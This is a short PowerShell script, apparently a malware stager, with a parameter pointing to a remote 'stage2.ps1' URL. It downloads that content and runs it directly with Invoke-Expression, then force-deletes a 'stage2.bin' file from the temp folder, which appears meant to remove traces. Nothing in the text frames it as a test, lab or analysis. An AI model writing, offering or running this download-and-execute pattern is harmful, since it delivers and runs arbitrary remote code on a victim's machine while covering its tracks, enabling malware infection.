
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://adatum.com:443/stage2.ps1',
    [int]$RequestTimeout = 115
)
IEX (Invoke-WebRequest -Uri $PayloadUrl -UseBasicParsing).Content
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
